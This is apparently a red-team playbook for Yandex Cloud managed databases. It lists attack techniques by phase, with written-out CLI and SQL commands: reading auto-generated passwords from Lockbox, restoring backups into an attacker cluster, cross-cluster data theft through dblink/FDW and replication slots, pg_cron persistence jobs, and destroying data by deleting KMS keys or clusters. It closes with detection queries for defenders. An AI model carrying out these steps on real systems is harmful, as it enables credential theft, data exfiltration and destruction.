# Yandex Cloud - Managed Databases Techniques

## Service Overview

Yandex Cloud offers managed database services for PostgreSQL, MySQL, ClickHouse, MongoDB, Kafka, OpenSearch, Greenplum, Valkey, and more. Each service follows a consistent pattern: clusters are deployed into VPC subnets, users/databases are managed through the cloud API (not SQL), and the `mdb.admin` cross-service role grants full control over ALL managed database types. There is no superuser access — database administration is constrained through Yandex-specific managed roles (`mdb_admin`, `mdb_superuser`, `mdb_replication`, `mdb_monitor`).

**Key Concepts:**
- **No Superuser Access**: Cannot access `postgres` system DB, manage users via SQL, or perform superuser actions
- **SQL GRANT Is Ephemeral**: Roles granted via SQL `GRANT` are revoked on the next database operation — only API-granted roles persist
- **MD5 Default**: PostgreSQL uses MD5 password hashing by default (not SCRAM-SHA-256)
- **Passwords in Lockbox**: Auto-generated credentials stored in Lockbox
- **IAM Authentication**: Direct IAM-to-database authentication via `clusters.connector` role
- **Connection Pooler**: PostgreSQL connections go through Odyssey pooler on port 6432
- **Disk Encryption**: Supports KMS key encryption; deleting the KMS key permanently destroys data

---

## Enumeration

### Enumerate Clusters

```bash
# List all PostgreSQL clusters
yc managed-postgresql cluster list

# Get detailed cluster info (hosts, config, network)
yc managed-postgresql cluster get <cluster_name_or_id>

# List cluster operations (who created/modified, when)
yc managed-postgresql cluster list-operations <cluster_name_or_id>

# Check access bindings
yc managed-postgresql cluster list-access-bindings <cluster_name_or_id>
```

Same pattern applies to other services:
```bash
yc managed-mysql cluster list
yc managed-clickhouse cluster list
yc managed-mongodb cluster list
yc managed-kafka cluster list
yc managed-opensearch cluster list
yc managed-greenplum cluster list
```

### Enumerate Hosts, Users, and Databases

```bash
# List hosts (reveals FQDNs, IPs, roles, public access status)
yc managed-postgresql host list --cluster-name <name>

# List database users
yc managed-postgresql user list --cluster-name <name>

# Get user details (roles, permissions, connection limits)
yc managed-postgresql user get <username> --cluster-id <id>

# List databases
yc managed-postgresql database list --cluster-name <name>

# Get database details (extensions, LC settings)
yc managed-postgresql database get <dbname> --cluster-name <name>
```

### Enumerate Backups

```bash
# List all backups in the folder
yc managed-postgresql backup list

# List backups for specific cluster
yc managed-postgresql cluster list-backups <cluster_name_or_id>
```

### Enumerate Logs

```bash
# View cluster logs (PostgreSQL + Odyssey pooler)
yc managed-postgresql cluster list-logs <cluster_name_or_id> \
  --service-type postgresql \
  --since "2024-01-01T00:00:00Z" \
  --until "2024-01-02T00:00:00Z"
```

### Host FQDN Patterns

Predictable FQDN patterns for managed database hosts:
- Individual hosts: `rc1[a-d]***.<dns-zone>`
- Read-write endpoint: `c-<cluster_ID>.rw.<dns-zone>`
- Read-only endpoint: `c-<cluster_ID>.ro.<dns-zone>`

---

## Credential Access

### Extract Passwords from Lockbox

Auto-generated database passwords are stored in Lockbox:

```bash
# Find Lockbox secrets related to managed databases
yc lockbox secret list --format json | \
  jq '.[] | select(.name | test("mdb|postgres|mysql|clickhouse|managed"))'

# Read the password (requires lockbox.payloadViewer)
yc lockbox payload get <secret_id>
```

### IAM-Based Database Authentication

The `clusters.connector` role enables passwordless IAM authentication:

```bash
# Connect to PostgreSQL using IAM token
yc managed-postgresql connect <cluster_name> --db <database_name>

# Get IAM token for direct psql connection
export PGPASSWORD=$(yc iam create-token)
psql "host=c-<cluster_id>.rw.<dns-zone> port=6432 \
  sslmode=verify-full dbname=<db> user=<iam_user>"
```

### Exploit MD5 Password Hashing

PostgreSQL clusters default to MD5 password hashing. If you can intercept authentication traffic within the VPC (private hosts allow unencrypted connections):

```bash
# Check cluster password encryption setting
yc managed-postgresql cluster get <cluster> --format json | \
  jq '.config.postgresql_config.password_encryption'
```

### Connection Manager Credentials

Managed connections in Connection Manager (Metadata Hub) auto-store credentials:

```bash
# List managed connections
yc metadata-hub connection-manager connection list

# Connection credentials are stored in Lockbox secrets
```

---

## Privilege Escalation

### mdb_admin Role Exploitation

The `mdb_admin` in-database role grants access to powerful extensions:

```sql
-- Cross-database connections via dblink (requires mdb_admin)
SELECT * FROM dblink(
  'host=c-<other_cluster>.rw.<dns-zone> port=6432 dbname=<db> user=<user> password=<pass>',
  'SELECT * FROM sensitive_table'
) AS t(col1 text, col2 text);

-- Foreign data wrappers for persistent remote access
CREATE SERVER foreign_pg FOREIGN DATA WRAPPER postgres_fdw
  OPTIONS (host 'c-<cluster>.rw.<dns-zone>', port '6432', dbname '<db>');
CREATE USER MAPPING FOR CURRENT_USER SERVER foreign_pg
  OPTIONS (user '<user>', password '<pass>');

-- Schedule arbitrary SQL via pg_cron (requires mdb_admin)
SELECT cron.schedule('exfil-job', '*/5 * * * *',
  $$COPY sensitive_table TO '/tmp/dump.csv'$$);

-- Oracle access from PostgreSQL
CREATE SERVER oracle_srv FOREIGN DATA WRAPPER oracle_fdw
  OPTIONS (dbserver '//oracle-host:1521/orcl');
```

### Cross-Service Admin Escalation

The `mdb.admin` role grants full admin across ALL managed database services:

```bash
# With mdb.admin, manage any database type
yc managed-postgresql cluster update <pg_cluster> ...
yc managed-mysql cluster update <mysql_cluster> ...
yc managed-clickhouse cluster update <ch_cluster> ...
```

### Enable Public Access on Private Hosts

```bash
# Make a private host publicly accessible
yc managed-postgresql host update <host_fqdn> \
  --cluster-name <name> \
  --assign-public-ip true
```

---

## Lateral Movement

### Backup Restore to Attacker-Controlled Cluster

With `*.restorer` role, restore any backup to a new cluster you control:

```bash
# List available backups
yc managed-postgresql backup list

# Restore to a new cluster (copies all data)
yc managed-postgresql cluster restore \
  --backup-id <backup_id> \
  --name attacker-cluster \
  --environment PRODUCTION \
  --network-id <network_id> \
  --resource-preset s3-c2-m8 \
  --disk-size 20 \
  --disk-type network-ssd \
  --host zone-id=ru-central1-a,subnet-id=<subnet_id>
```

### Cross-Database Data Movement via dblink/FDW

```sql
-- Query data from another PostgreSQL cluster
SELECT * FROM dblink(
  'host=c-<target_cluster>.rw.<dns-zone> port=6432 dbname=<db> user=<user> password=<pass>',
  'SELECT * FROM users'
) AS t(id int, username text, email text, password_hash text);

-- ClickHouse access from PostgreSQL (PG 14-15 only)
CREATE SERVER ch_server FOREIGN DATA WRAPPER clickhouse_fdw
  OPTIONS (host '<ch-host>', port '8443', dbname 'default', driver 'http');
```

### Data Transfer Service

```bash
# Move data between any supported source/target pair
# PostgreSQL → Object Storage, MySQL → ClickHouse, etc.
# Requires data-transfer.editor role
```

### Logical Replication for Continuous Data Capture

```sql
-- Create replication slot (requires mdb_replication role)
SELECT pg_create_logical_replication_slot('exfil_slot', 'wal2json');

-- Read changes continuously
SELECT * FROM pg_logical_slot_get_changes('exfil_slot', NULL, NULL);
```

---

## Persistence

### pg_cron Scheduled Tasks

```sql
-- Schedule recurring SQL execution (requires mdb_admin)
SELECT cron.schedule('persist-job', '0 */6 * * *',
  $$INSERT INTO attacker_log SELECT * FROM audit_table$$);

-- List scheduled jobs
SELECT * FROM cron.job;
```

### Replication Slots

```sql
-- Create persistent logical replication slot
SELECT pg_create_logical_replication_slot('persistent_slot', 'pgoutput');

-- Slot persists across restarts and continues accumulating WAL
```

### Database User Creation

```bash
# Create a new database user (requires *.editor)
yc managed-postgresql user create <username> \
  --cluster-name <name> \
  --password <password> \
  --permissions db_name=<database>

# Enable deletion protection on user
yc managed-postgresql user update <username> \
  --cluster-name <name> \
  --deletion-protection true
```

### Backup Retention

Backups are retained for **7 days after cluster deletion** — deleted cluster data remains accessible.

---

## Post-Exploitation

### Data Exfiltration Paths

1. **Backup restore** to attacker-controlled cluster in same folder
2. **Logical replication** via `wal2json` / `pgoutput` WAL plugins
3. **Data Transfer** service to external targets
4. **dblink / FDW** to push data to external databases
5. **Public access** enablement on hosts + direct connection

### Destroy Data via KMS Key

If disk encryption uses a custom KMS key:

```bash
# Deactivating the KMS key suspends all data access
yc kms symmetric-key update <key_id> --status disabled

# Deleting the KMS key permanently destroys ALL encrypted data
yc kms symmetric-key delete <key_id>
```

### Force Read-Only Mode

Storage at 97% triggers automatic read-only mode — fill storage to deny writes.

### Cluster Manipulation

```bash
# Stop a cluster (denial of service)
yc managed-postgresql cluster stop <cluster_name>

# Delete a cluster
yc managed-postgresql cluster delete <cluster_name>

# Trigger failover
yc managed-postgresql cluster start-failover <cluster_name> \
  --host-name <non_public_host_fqdn>
# If failover promotes a non-public host to master, master becomes
# unreachable from the internet
```

---

## Network Considerations

| Service | Ports |
|---|---|
| PostgreSQL | 6432 (Odyssey pooler) |
| MySQL | 3306 |
| ClickHouse | 8443/9440 (TLS), 8123/9000 (plaintext) |

- **Public hosts** require SSL
- **Private hosts** allow unencrypted connections within VPC
- Cluster network **cannot be changed** after creation
- Security groups control access; `vpc.user` required for cluster creation

---

## Key IAM Roles

| Role | Capabilities |
|---|---|
| `managed-postgresql.clusters.connector` | IAM-based database authentication |
| `managed-postgresql.auditor` | View cluster metadata, quotas |
| `managed-postgresql.viewer` | View clusters, hosts, users, databases, backups, logs |
| `managed-postgresql.restorer` | Restore clusters from backups |
| `managed-postgresql.editor` | Create/modify/delete clusters, users, databases |
| `managed-postgresql.admin` | Full control + access binding management |
| `mdb.admin` | **Full admin across ALL managed DB services** |
| `lockbox.payloadViewer` | View auto-generated database passwords |
| `vpc.user` | Required for cluster creation |

---

## Detection and Logging

### Audit Trail Events

**Management Events** (per service, e.g., `event_source: mdb.postgresql`):
- `CreateCluster` / `DeleteCluster` / `UpdateCluster` — cluster lifecycle
- `StartCluster` / `StopCluster` — availability changes
- `CreateUser` / `DeleteUser` / `UpdateUser` — user management
- `CreateDatabase` / `DeleteDatabase` — database management
- `GrantUserPermission` / `RevokeUserPermission` — permission changes
- `StartClusterFailover` — manual failover
- `RestoreCluster` — backup restores
- `AddClusterHost` / `DeleteClusterHost` / `UpdateClusterHosts` — host changes
- `UpdateAccessBindings` — IAM role changes

### In-Database Auditing

- **pgaudit extension** must be explicitly installed and configured per-user
- Not enabled by default — most clusters have no SQL-level audit trail
- Odyssey pooler logs show connection events

### Detection Queries

**Detect backup restores (data exfiltration attempt)**:
```
event_type LIKE "%RestoreCluster%"
```

**Detect public access enablement**:
```
event_type LIKE "%UpdateClusterHosts%" AND details CONTAINS "assign_public_ip"
```

**Detect new user creation**:
```
event_type LIKE "%CreateUser%"
```

---

## Security-Critical PostgreSQL Extensions

| Extension | Risk Level | Description |
|---|---|---|
| `dblink` | High | Cross-database connections (requires `mdb_admin`) |
| `postgres_fdw` | High | Foreign PostgreSQL server access (requires `mdb_admin`) |
| `oracle_fdw` | High | Foreign Oracle access (requires `mdb_admin`) |
| `clickhouse_fdw` | High | Foreign ClickHouse access (PG 14-15 only) |
| `pg_cron` | High | Scheduled arbitrary SQL (requires `mdb_admin`) |
| `pglogical` | Medium | Streaming logical replication |
| `pgcrypto` | Low | Column-level encryption |
| `pgaudit` | Defensive | SQL-level audit logging |
| `pg_stat_statements` | Low | Query statistics (requires `mdb_monitor`) |

---

## References

- Managed PostgreSQL Documentation: `en/managed-postgresql/`
- Managed MySQL Documentation: `en/managed-mysql/`
- Managed ClickHouse Documentation: `en/managed-clickhouse/`
- Access Management: `en/managed-postgresql/security/index.md`
- CLI Reference: `en/cli/cli-ref/managed-postgresql/cli-ref/`
- Connection Manager: `en/metadata-hub/concepts/connection-manager.md`
